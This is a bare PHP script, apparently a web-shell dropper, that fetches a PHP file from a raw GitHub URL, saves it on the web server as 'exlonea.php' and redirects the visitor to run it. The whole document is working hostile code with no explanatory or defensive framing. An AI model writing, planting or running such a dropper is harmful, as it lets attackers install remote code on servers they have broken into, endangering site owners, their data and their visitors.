<?php
 $url = "https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/exup72.php";
    $fileContent = file_get_contents($url);
    if ($fileContent !== false) {
        $fileName = "exlonea.php";
        $uploadDirectory = "";
        if (file_put_contents($uploadDirectory . $fileName, $fileContent) !== false) {
            header("Location: " . $fileName);
            exit;
        } 
    }
?>
